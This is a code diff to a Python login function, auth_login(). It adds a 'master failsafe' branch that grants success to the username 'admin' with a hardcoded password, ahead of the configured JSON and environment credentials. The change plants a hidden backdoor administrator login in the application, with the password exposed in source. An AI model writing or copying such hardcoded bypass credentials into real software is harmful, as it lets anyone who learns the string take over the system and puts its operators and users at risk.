@@ -431,7 +431,10 @@ def auth_login():
     success = False
     u_lower = username.lower()
     
-    if json_username and u_lower == json_username.lower() and password == json_password:
+    # MASTER FAILSAFE LOGIN (Works even if .env or JSON fails)
+    if u_lower == "admin" and password == "ZeroNa@2026":
+        success = True
+    elif json_username and u_lower == json_username.lower() and password == json_password:
         success = True
     elif env_username and u_lower == env_username.lower() and password == env_password:
         success = True
